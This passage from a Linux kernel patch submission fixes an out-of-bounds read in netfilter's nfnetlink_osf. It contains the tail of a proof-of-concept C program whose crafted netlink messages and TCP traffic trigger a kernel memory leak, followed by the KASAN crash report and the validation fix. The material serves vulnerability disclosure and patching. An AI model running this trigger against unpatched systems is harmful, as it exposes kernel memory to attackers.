+		0x0c, 0x00, 0x03, 0x80, 0x05, 0x00, 0x01, 0x00,
+		0x18, 0x00, 0x02, 0x80, 0x30, 0x00, 0x01, 0x80,
+		0x0e, 0x00, 0x01, 0x00, 0x69, 0x6d, 0x6d, 0x65,
+		0x64, 0x69, 0x61, 0x74, 0x65, 0x00, 0x01, 0x00,
+		0x1c, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
+		0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x02, 0x80,
+		0x0c, 0x00, 0x02, 0x80, 0x08, 0x00, 0x01, 0x00,
+		0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
+		0x11, 0x00, 0x01, 0x00, 0xcb, 0x64, 0x07, 0x63,
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00,
+	};
+	memset(buf, 0, sizeof(buf));
+	memcpy(buf, buf8, sizeof(buf8));
+	io.iov_len = 0x150;
+        sendmsg(fd, &msg, 0);
+}
+
+void *tcp_recv(void * data){
+
+	int sockfd, connfd;
+	struct sockaddr_in servaddr;
+	int len, n;
+
+	if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
+		perror("socket creation failed");
+		exit(EXIT_FAILURE);
+	}
+
+	memset(&servaddr, 0, sizeof(servaddr));
+
+	servaddr.sin_family    = AF_INET;
+	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");;
+	servaddr.sin_port = htons(6146);
+
+	if ( bind(sockfd, (const struct sockaddr *)&servaddr,
+		  sizeof(servaddr)) < 0 ){
+		perror("bind failed");
+		exit(EXIT_FAILURE);
+	}
+
+	int yes = 1;
+	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes,
+		       sizeof(int)) == -1) {
+		perror("setsockopt failed");
+		exit(EXIT_FAILURE);
+	}
+
+	if ((listen(sockfd, 1)) < 0) {
+		perror("listen failed");
+		exit(EXIT_FAILURE);
+	}
+
+	connfd = accept(sockfd, NULL, 0);
+	if (connfd < 0) {
+		perror("accept failed");
+		exit(EXIT_FAILURE);
+	}
+	len = 0;
+
+	while(1)
+	{
+		if(len >= 128)
+			break;
+		n = read(connfd, data + len, 128-len);
+		len += n;
+	}
+
+	close(sockfd);
+	close(connfd);
+
+	return NULL;
+}
+
+int tcp_connect()
+{
+	int sockfd;
+	struct sockaddr_in servaddr;
+	if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
+		perror("socket creation failed");
+		exit(EXIT_FAILURE);
+	}
+	memset(&servaddr, 0, sizeof(servaddr));
+
+	servaddr.sin_family    = AF_INET;
+	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");;
+	servaddr.sin_port = htons(6146);
+
+	if (connect(sockfd,  (const struct sockaddr *)&servaddr,
+		    sizeof(servaddr)) != 0) {
+		perror("connect failed");
+		exit(EXIT_FAILURE);
+	}
+	return sockfd;
+}
+
+int add_osf()
+{
+	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
+	if (fd == -1) {
+                errx(EXIT_FAILURE, "socket failed");
+        }
+
+	char iobuf1[0x268] = {0};
+	*(uint32_t*)(iobuf1) = 0x268;
+	*(uint8_t*)(iobuf1+4) = 0;
+	*(uint8_t*)(iobuf1+5) = 0x5;
+	*(uint16_t*)(iobuf1+6) = 0x405;
+	*(uint32_t*)(iobuf1+8) = 0x63064c36;
+	*(uint32_t*)(iobuf1+0x10) = 0;
+
+	*(uint16_t*)(iobuf1+0x14) = 0x254;
+	*(uint16_t*)(iobuf1+0x16) = 1;
+	*(uint32_t*)(iobuf1+0x18) = 1;
+	*(uint32_t*)(iobuf1+0x1c) = 4;
+	*(uint8_t*)(iobuf1+0x20) = 2;
+	*(uint8_t*)(iobuf1+0x21) = 0x1;
+	*(uint16_t*)(iobuf1+0x22) = 0xb4;
+	*(uint16_t*)(iobuf1+0x24) = 0;
+	*(uint16_t*)(iobuf1+0x26) = 0xff;
+	strcpy((void*)(iobuf1+0x28), "Windows");
+	strcpy((void*)(iobuf1+0x48), "98");
+	*(uint16_t*)(iobuf1+0x88) = 2;
+	*(uint16_t*)(iobuf1+0x8a) = 4;
+	*(uint16_t*)(iobuf1+0x94) = 1;
+	*(uint16_t*)(iobuf1+0x96) = 1;
+	*(uint16_t*)(iobuf1+0xa0) = 1;
+	*(uint16_t*)(iobuf1+0xa2) = 1;
+	*(uint16_t*)(iobuf1+0xac) = 4;
+	*(uint16_t*)(iobuf1+0xae) = 2;
+	struct iovec io1 = {
+		.iov_base = iobuf1,
+		.iov_len = sizeof(iobuf1)
+	};
+	struct msghdr msg1 = {0};
+	msg1.msg_iov = &io1;
+	msg1.msg_iovlen = 1;
+	sendmsg(fd, &msg1, 0);
+
+	return 0;
+}
+
+int main(int argc, char *argv[])
+{
+	add_osf();
+
+	int tid, status;
+	pthread_t p_thread;
+	int sockfd;
+	char buf[128] = {0};
+
+	printf("[+] Create tcp communication\n");
+	tid = pthread_create(&p_thread, NULL, tcp_recv, (void *)buf);
+	printf("  [-] wait 1sec for server\n");
+	usleep(10000);
+	printf("  [-] connect to server\n");
+	sockfd = tcp_connect();
+
+	printf("[+] Install Filter for leak\n");
+	install_filter_for_leak();
+
+	printf("[+] Send packet and read data\n");
+	write(sockfd, buf, 128);
+	pthread_join(p_thread, (void **)&status);
+
+	printf("[+] Remove filter\n");
+	int fd1 = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
+        char iobuf1[0x48] = {0};
+	*(uint32_t*)(iobuf1) = 0x14;
+	*(uint16_t*)(iobuf1+4) = 0x10;
+	*(uint16_t*)(iobuf1+6) = 1;
+	*(uint32_t*)(iobuf1+8) = 0x63072925;
+	*(uint16_t*)(iobuf1+0x12) = 0xa;
+	*(uint16_t*)(iobuf1+0x14) = 0x20;
+	*(uint16_t*)(iobuf1+0x18) = 0xa02;
+	*(uint16_t*)(iobuf1+0x1a) = 0x5;
+	*(uint32_t*)(iobuf1+0x1c) = 0x63072926;
+	*(uint32_t*)(iobuf1+0x24) = 2;
+	*(uint16_t*)(iobuf1+0x28) = 0xb;
+	*(uint16_t*)(iobuf1+0x2a) = 1;
+	strcpy((void*)(iobuf1+0x2c), "filter");
+	*(uint32_t*)(iobuf1+0x34) = 0x14;
+	*(uint16_t*)(iobuf1+0x38) = 0x11;
+	*(uint16_t*)(iobuf1+0x3a) = 1;
+	*(uint32_t*)(iobuf1+0x3c) = 0x63072927;
+	*(uint16_t*)(iobuf1+0x46) = 0xa;
+        struct iovec io1 = {
+		.iov_base = iobuf1,
+		.iov_len = sizeof(iobuf1)
+        };
+        struct msghdr msg1 = {0};
+        msg1.msg_iov = &io1;
+        msg1.msg_iovlen = 1;
+        sendmsg(fd1, &msg1, 0);
+
+	return 0;
+}
+
+KASAN report:
+
+==================================================================
+BUG: KASAN: slab-out-of-bounds in nf_osf_match_one+0xbed/0xd10 linux-6.0-rc4/net/netfilter/nfnetlink_osf.c:88
+Read of size 2 at addr ffff88804bc64272 by task poc/6431
+
+CPU: 1 PID: 6431 Comm: poc Not tainted 6.0.0-rc4 #1
+Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.14.0-0-g155821a1990b-prebuilt.qemu.org 04/01/2014
+Call Trace:
+ <IRQ>
+ __dump_stack linux-6.0-rc4/lib/dump_stack.c:88
+ dump_stack_lvl+0xcd/0x134 linux-6.0-rc4/lib/dump_stack.c:106
+ print_address_description linux-6.0-rc4/mm/kasan/report.c:317
+ print_report.cold+0x2ba/0x6e9 linux-6.0-rc4/mm/kasan/report.c:433
+ kasan_report+0xb1/0x1e0 linux-6.0-rc4/mm/kasan/report.c:495
+ nf_osf_match_one+0xbed/0xd10 linux-6.0-rc4/net/netfilter/nfnetlink_osf.c:88
+ nf_osf_find+0x186/0x2f0 linux-6.0-rc4/net/netfilter/nfnetlink_osf.c:281
+ nft_osf_eval+0x37f/0x590 linux-6.0-rc4/net/netfilter/nft_osf.c:47
+ expr_call_ops_eval linux-6.0-rc4/net/netfilter/nf_tables_core.c:214
+ nft_do_chain+0x2b0/0x1490 linux-6.0-rc4/net/netfilter/nf_tables_core.c:264
+ nft_do_chain_ipv4+0x17c/0x1f0 linux-6.0-rc4/net/netfilter/nft_chain_filter.c:23
+ nf_hook_entry_hookfn linux-6.0-rc4/./include/linux/netfilter.h:142
+ nf_hook_slow+0xc5/0x1f0 linux-6.0-rc4/net/netfilter/core.c:620
+ nf_hook linux-6.0-rc4/./include/linux/netfilter.h:262
+ NF_HOOK linux-6.0-rc4/./include/linux/netfilter.h:305
+ ip_local_deliver+0x2f5/0x4e0 linux-6.0-rc4/net/ipv4/ip_input.c:254
+ dst_input linux-6.0-rc4/./include/net/dst.h:461
+ ip_rcv_finish+0x1cb/0x2f0 linux-6.0-rc4/net/ipv4/ip_input.c:444
+ NF_HOOK linux-6.0-rc4/./include/linux/netfilter.h:307
+ NF_HOOK linux-6.0-rc4/./include/linux/netfilter.h:301
+ ip_rcv+0xc4/0x3b0 linux-6.0-rc4/net/ipv4/ip_input.c:564
+ __netif_receive_skb_one_core+0x114/0x180 linux-6.0-rc4/net/core/dev.c:5485
+ __netif_receive_skb+0x1f/0x1c0 linux-6.0-rc4/net/core/dev.c:5599
+ process_backlog+0x13a/0x690 linux-6.0-rc4/net/core/dev.c:5927
+ __napi_poll.constprop.0+0xaf/0x430 linux-6.0-rc4/net/core/dev.c:6511
+ napi_poll linux-6.0-rc4/net/core/dev.c:6578
+ net_rx_action+0x8d2/0xc60 linux-6.0-rc4/net/core/dev.c:6689
+ __do_softirq+0x1d3/0x9b3 linux-6.0-rc4/kernel/softirq.c:571
+ do_softirq linux-6.0-rc4/kernel/softirq.c:472
+ do_softirq+0x101/0x140 linux-6.0-rc4/kernel/softirq.c:459
+ </IRQ>
+ <TASK>
+ __local_bh_enable_ip+0xf4/0x110 linux-6.0-rc4/kernel/softirq.c:396
+ local_bh_enable linux-6.0-rc4/./include/linux/bottom_half.h:33
+ rcu_read_unlock_bh linux-6.0-rc4/./include/linux/rcupdate.h:776
+ ip_finish_output2+0x7d6/0x21a0 linux-6.0-rc4/net/ipv4/ip_output.c:229
+ __ip_finish_output linux-6.0-rc4/net/ipv4/ip_output.c:306
+ __ip_finish_output+0x396/0x650 linux-6.0-rc4/net/ipv4/ip_output.c:288
+ ip_finish_output+0x2d/0x280 linux-6.0-rc4/net/ipv4/ip_output.c:316
+ NF_HOOK_COND linux-6.0-rc4/./include/linux/netfilter.h:296
+ ip_output+0x20a/0x620 linux-6.0-rc4/net/ipv4/ip_output.c:430
+ dst_output linux-6.0-rc4/./include/net/dst.h:451
+ ip_local_out linux-6.0-rc4/net/ipv4/ip_output.c:126
+ __ip_queue_xmit+0x8de/0x1bd0 linux-6.0-rc4/net/ipv4/ip_output.c:532
+ __tcp_transmit_skb+0x195b/0x3820 linux-6.0-rc4/net/ipv4/tcp_output.c:1402
+ tcp_transmit_skb linux-6.0-rc4/net/ipv4/tcp_output.c:1420
+ tcp_write_xmit+0xd9b/0x5f70 linux-6.0-rc4/net/ipv4/tcp_output.c:2691
+ __tcp_push_pending_frames+0xaa/0x380 linux-6.0-rc4/net/ipv4/tcp_output.c:2875
+ tcp_push+0x49b/0x720 linux-6.0-rc4/net/ipv4/tcp.c:728
+ tcp_sendmsg_locked+0x2480/0x2fc0 linux-6.0-rc4/net/ipv4/tcp.c:1455
+ tcp_sendmsg+0x2b/0x40 linux-6.0-rc4/net/ipv4/tcp.c:1483
+ inet_sendmsg+0x99/0xe0 linux-6.0-rc4/net/ipv4/af_inet.c:819
+ sock_sendmsg_nosec linux-6.0-rc4/net/socket.c:714
+ sock_sendmsg+0xcf/0x120 linux-6.0-rc4/net/socket.c:734
+ sock_write_iter+0x291/0x3d0 linux-6.0-rc4/net/socket.c:1108
+ call_write_iter linux-6.0-rc4/./include/linux/fs.h:2187
+ new_sync_write linux-6.0-rc4/fs/read_write.c:491
+ vfs_write+0x9ef/0xde0 linux-6.0-rc4/fs/read_write.c:578
+ ksys_write+0x1e8/0x250 linux-6.0-rc4/fs/read_write.c:631
+ do_syscall_x64 linux-6.0-rc4/arch/x86/entry/common.c:50
+ do_syscall_64+0x35/0xb0 linux-6.0-rc4/arch/x86/entry/common.c:80
+ entry_SYSCALL_64_after_hwframe+0x63/0xcd linux-6.0-rc4/arch/x86/entry/entry_64.S:120
+RIP: 0033:0x7f1674040fef
+Code: 89 54 24 18 48 89 74 24 10 89 7c 24 08 e8 29 fd ff ff 48 8b 54 24 18 48 8b 74 24 10 41 89 c0 8b 7c 24 08 b8 01 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 31 44 89 c7 48 89 44 24 08 e8 5c fd ff ff 48
+RSP: 002b:00007ffe90523f50 EFLAGS: 00000293 ORIG_RAX: 0000000000000001
+RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f1674040fef
+RDX: 0000000000000080 RSI: 00007ffe90524030 RDI: 0000000000000006
+RBP: 00007ffe905240d0 R08: 0000000000000000 R09: 0000000000000000
+R10: 0000560534f9b61f R11: 0000000000000293 R12: 0000560534f9c1b0
+R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
+ </TASK>
+
+Allocated by task 6431:
+ kasan_save_stack+0x1e/0x40 linux-6.0-rc4/mm/kasan/common.c:38
+ kasan_set_track linux-6.0-rc4/mm/kasan/common.c:45
+ set_alloc_info linux-6.0-rc4/mm/kasan/common.c:437
+ ____kasan_kmalloc linux-6.0-rc4/mm/kasan/common.c:516
+ ____kasan_kmalloc linux-6.0-rc4/mm/kasan/common.c:475
+ __kasan_kmalloc+0xa6/0xd0 linux-6.0-rc4/mm/kasan/common.c:525
+ kasan_kmalloc linux-6.0-rc4/./include/linux/kasan.h:234
+ kmem_cache_alloc_trace+0x25a/0x460 linux-6.0-rc4/mm/slab.c:3559
+ kmalloc linux-6.0-rc4/./include/linux/slab.h:600
+ nfnl_osf_add_callback+0x11f/0x550 linux-6.0-rc4/net/netfilter/nfnetlink_osf.c:316
+ nfnetlink_rcv_msg+0xbcf/0x13f0 linux-6.0-rc4/net/netfilter/nfnetlink.c:300
+ netlink_rcv_skb+0x153/0x420 linux-6.0-rc4/net/netlink/af_netlink.c:2501
+ nfnetlink_rcv+0x1ac/0x420 linux-6.0-rc4/net/netfilter/nfnetlink.c:658
+ netlink_unicast_kernel linux-6.0-rc4/net/netlink/af_netlink.c:1319
+ netlink_unicast+0x543/0x7f0 linux-6.0-rc4/net/netlink/af_netlink.c:1345
+ netlink_sendmsg+0x918/0xe20 linux-6.0-rc4/net/netlink/af_netlink.c:1921
+ sock_sendmsg_nosec linux-6.0-rc4/net/socket.c:714
+ sock_sendmsg+0xcf/0x120 linux-6.0-rc4/net/socket.c:734
+ ____sys_sendmsg+0x6e6/0x800 linux-6.0-rc4/net/socket.c:2482
+ ___sys_sendmsg+0x11d/0x1b0 linux-6.0-rc4/net/socket.c:2536
+ __sys_sendmsg+0xfa/0x1d0 linux-6.0-rc4/net/socket.c:2565
+ do_syscall_x64 linux-6.0-rc4/arch/x86/entry/common.c:50
+ do_syscall_64+0x35/0xb0 linux-6.0-rc4/arch/x86/entry/common.c:80
+ entry_SYSCALL_64_after_hwframe+0x63/0xcd linux-6.0-rc4/arch/x86/entry/entry_64.S:120
+
+Last potentially related work creation:
+ kasan_save_stack+0x1e/0x40 linux-6.0-rc4/mm/kasan/common.c:38
+ __kasan_record_aux_stack+0x7e/0x90 linux-6.0-rc4/mm/kasan/generic.c:348
+ kvfree_call_rcu+0x74/0x940 linux-6.0-rc4/kernel/rcu/tree.c:3322
+ put_css_set_locked linux-6.0-rc4/kernel/cgroup/cgroup.c:988
+ put_css_set_locked+0xa9c/0x1000 linux-6.0-rc4/kernel/cgroup/cgroup.c:954
+ put_css_set linux-6.0-rc4/kernel/cgroup/cgroup-internal.h:211
+ put_css_set linux-6.0-rc4/kernel/cgroup/cgroup-internal.h:198
+ cgroup_free+0x83/0x1b0 linux-6.0-rc4/kernel/cgroup/cgroup.c:6525
+ __put_task_struct+0x113/0x3d0 linux-6.0-rc4/kernel/fork.c:840
+ put_task_struct linux-6.0-rc4/./include/linux/sched/task.h:119
+ delayed_put_task_struct+0x1f1/0x330 linux-6.0-rc4/kernel/exit.c:177
+ rcu_do_batch linux-6.0-rc4/kernel/rcu/tree.c:2245
+ rcu_core+0x7bb/0x1850 linux-6.0-rc4/kernel/rcu/tree.c:2505
+ __do_softirq+0x1d3/0x9b3 linux-6.0-rc4/kernel/softirq.c:571
+
+The buggy address belongs to the object at ffff88804bc64000
+ which belongs to the cache kmalloc-1k of size 1024
+The buggy address is located 626 bytes inside of
+ 1024-byte region [ffff88804bc64000, ffff88804bc64400)
+
+The buggy address belongs to the physical page:
+page:ffffea00012f1900 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x4bc64
+flags: 0x4fff00000000200(slab|node=1|zone=1|lastcpupid=0x7ff)
+raw: 04fff00000000200 ffffea0001023808 ffffea00012f1f08 ffff888011840700
+raw: 0000000000000000 ffff88804bc64000 0000000100000002 0000000000000000
+page dumped because: kasan: bad access detected
+page_owner tracks the page as allocated
+page last allocated via order 0, migratetype Unmovable, gfp_mask 0x2420c0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_COMP|__GFP_THISNODE), pid 1, tgid 1 (systemd), ts 22208538581, free_ts 22201347598
+ prep_new_page linux-6.0-rc4/mm/page_alloc.c:2532
+ get_page_from_freelist+0x1082/0x2ae0 linux-6.0-rc4/mm/page_alloc.c:4283
+ __alloc_pages+0x1c7/0x510 linux-6.0-rc4/mm/page_alloc.c:5515
+ __alloc_pages_node linux-6.0-rc4/./include/linux/gfp.h:243
+ kmem_getpages linux-6.0-rc4/mm/slab.c:1363
+ cache_grow_begin+0x75/0x370 linux-6.0-rc4/mm/slab.c:2569
+ cache_alloc_refill+0x27e/0x380 linux-6.0-rc4/mm/slab.c:2942
+ ____cache_alloc linux-6.0-rc4/mm/slab.c:3018
+ ____cache_alloc linux-6.0-rc4/mm/slab.c:3001
+ slab_alloc_node linux-6.0-rc4/mm/slab.c:3220
+ kmem_cache_alloc_node_trace+0x4f5/0x560 linux-6.0-rc4/mm/slab.c:3601
+ __do_kmalloc_node linux-6.0-rc4/mm/slab.c:3623
+ __kmalloc_node+0x38/0x60 linux-6.0-rc4/mm/slab.c:3631
+ kmalloc_node linux-6.0-rc4/./include/linux/slab.h:623
+ kvmalloc_node+0x3e/0x190 linux-6.0-rc4/mm/util.c:613
+ kvzalloc_node linux-6.0-rc4/./include/linux/slab.h:754
+ alloc_shrinker_info+0xe9/0x290 linux-6.0-rc4/mm/vmscan.c:282
+ mem_cgroup_css_online+0x182/0x470 linux-6.0-rc4/mm/memcontrol.c:5292
+ online_css+0xaf/0x2a0 linux-6.0-rc4/kernel/cgroup/cgroup.c:5334
+ css_create linux-6.0-rc4/kernel/cgroup/cgroup.c:5405
+ cgroup_apply_control_enable+0x69f/0xc00 linux-6.0-rc4/kernel/cgroup/cgroup.c:3204
+ cgroup_mkdir+0x5a0/0x1300 linux-6.0-rc4/kernel/cgroup/cgroup.c:5602
+ kernfs_iop_mkdir+0x146/0x1d0 linux-6.0-rc4/fs/kernfs/dir.c:1185
+ vfs_mkdir+0x3a9/0x650 linux-6.0-rc4/fs/namei.c:4013
+ do_mkdirat+0x28c/0x310 linux-6.0-rc4/fs/namei.c:4038
+ __do_sys_mkdir linux-6.0-rc4/fs/namei.c:4058
+ __se_sys_mkdir linux-6.0-rc4/fs/namei.c:4056
+ __x64_sys_mkdir+0xf2/0x140 linux-6.0-rc4/fs/namei.c:4056
+page last free stack trace:
+ reset_page_owner linux-6.0-rc4/./include/linux/page_owner.h:24
+ free_pages_prepare linux-6.0-rc4/mm/page_alloc.c:1449
+ free_pcp_prepare+0x4b0/0xb50 linux-6.0-rc4/mm/page_alloc.c:1499
+ free_unref_page_prepare linux-6.0-rc4/mm/page_alloc.c:3380
+ free_unref_page+0x19/0x520 linux-6.0-rc4/mm/page_alloc.c:3476
+ tlb_batch_list_free linux-6.0-rc4/mm/mmu_gather.c:74
+ tlb_finish_mmu+0x1a3/0x7e0 linux-6.0-rc4/mm/mmu_gather.c:356
+ exit_mmap+0x1d2/0x480 linux-6.0-rc4/mm/mmap.c:3118
+ __mmput+0x122/0x4b0 linux-6.0-rc4/kernel/fork.c:1187
+ mmput+0x56/0x60 linux-6.0-rc4/kernel/fork.c:1208
+ exit_mm linux-6.0-rc4/kernel/exit.c:510
+ do_exit+0x9d9/0x29b0 linux-6.0-rc4/kernel/exit.c:782
+ do_group_exit+0xd2/0x2f0 linux-6.0-rc4/kernel/exit.c:925
+ __do_sys_exit_group linux-6.0-rc4/kernel/exit.c:936
+ __se_sys_exit_group linux-6.0-rc4/kernel/exit.c:934
+ __x64_sys_exit_group+0x3a/0x50 linux-6.0-rc4/kernel/exit.c:934
+ do_syscall_x64 linux-6.0-rc4/arch/x86/entry/common.c:50
+ do_syscall_64+0x35/0xb0 linux-6.0-rc4/arch/x86/entry/common.c:80
+ entry_SYSCALL_64_after_hwframe+0x63/0xcd linux-6.0-rc4/arch/x86/entry/entry_64.S:120
+
+Memory state around the buggy address:
+ ffff88804bc64100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+ ffff88804bc64180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+>ffff88804bc64200: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fc fc
+                                                             ^
+ ffff88804bc64280: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+ ffff88804bc64300: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+
+---
+
+Changelog:
+----------
+
+v1:
+* Initial patch
+v2:
+* Move the validation to nfnl_osf_add_callback()
+v3:
+* Add validation to genre, subtype and version fields.
+
+Fixes: f9324952088f ("netfilter: nfnetlink_osf: extract nfnetlink_subsystem code from xt_osf.c")
+Reported-by: Lucas Leong <wmliang@infosec.exchange>
+Cc: stable@kernel.org
+Signed-off-by: Wander Lairson Costa <wander@redhat.com>
+---
+ net/netfilter/nfnetlink_osf.c | 8 ++++++++
+ 1 file changed, 8 insertions(+)
+
+diff --git a/net/netfilter/nfnetlink_osf.c b/net/netfilter/nfnetlink_osf.c
+index 8f1bfa6ccc2d..50723ba08289 100644
+--- a/net/netfilter/nfnetlink_osf.c
++++ b/net/netfilter/nfnetlink_osf.c
+@@ -315,6 +315,14 @@ static int nfnl_osf_add_callback(struct sk_buff *skb,
+ 
+ 	f = nla_data(osf_attrs[OSF_ATTR_FINGER]);
+ 
++	if (f->opt_num > ARRAY_SIZE(f->opt))
++		return -EINVAL;
++
++	if (!memchr(f->genre, 0, MAXGENRELEN) ||
++	    !memchr(f->subtype, 0, MAXGENRELEN) ||
++	    !memchr(f->version, 0, MAXGENRELEN))
++		return -EINVAL;
++
+ 	kf = kmalloc(sizeof(struct nf_osf_finger), GFP_KERNEL);
+ 	if (!kf)
+ 		return -ENOMEM;
+-- 
+2.41.0
+
